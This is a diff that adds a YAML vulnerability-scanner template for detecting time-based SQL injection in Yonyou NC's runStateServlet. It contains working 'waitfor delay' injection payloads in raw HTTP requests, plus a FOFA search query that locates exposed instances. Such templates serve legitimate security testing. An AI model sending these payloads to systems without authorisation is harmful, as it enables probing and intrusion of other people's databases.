@@ -1,0 +1,33 @@
+id: yonyou-nc-runstateservlet-sqli
+
+info:
+  name: Yonyou NC runStateServlet - SQL Injection
+  author: Co5mos
+  severity: high
+  description: Detects SQL Injection vulnerability in Yonyou NC runStateServlet with parameter proInsPk and proDefPk.
+  reference:
+    https://github.com/wy876/POC/commit/80042f9f89a2370ca1b6882a0bd075158e25c6cc
+  metadata:
+    fofa-query: icon_hash="1085941792"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        @timeout: 15s
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 500'
+          - 'contains(body, "<title>Error</title>")'
+        condition: and
